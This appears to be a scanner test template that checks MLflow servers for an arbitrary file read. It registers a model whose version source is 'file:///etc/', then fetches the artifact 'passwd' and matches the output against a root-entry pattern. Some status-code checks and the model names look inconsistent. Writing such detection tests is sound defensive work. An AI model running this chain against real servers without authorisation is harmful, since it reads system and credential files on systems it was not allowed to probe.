api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
execute:
  type: multiple
  requests:
    - req:
        - modify_method: POST
        - modify_url: "/ajax-api/2.0/mlflow/registered-models/create"
        - replace_body: '{"name":"abcdefgh"}'
        - validate:
            response_code:
              gte: 505
        - success: x2
        - failure: exit
    - req:
        - modify_method: POST
        - modify_url: "/ajax-api/2.0/mlflow/model-versions/create"
        - replace_body: '{"name":"abcdefgh","source":"file:///etc/"}'
        - validate:
            response_code:
              gte: 505
            response_payload:
              for_one:
                key:
                  eq: "version"
                value:
                  extract: versionVar
        - success: x3
        - failure: exit
    - req:
        - modify_method: GET
        - modify_url: "/model-versions/get-artifact?path=passwd&name=AJAX-API&version=${versionVar}"
        - replace_body: '{}'
        - validate:
            response_code:
              eq: 200
            response_payload:
              length:
                gt: 0
              regex: "root:.*:0:0:"
              not_contains:
                - <html>
                - </html>
        - success: vulnerable
        - failure: exit
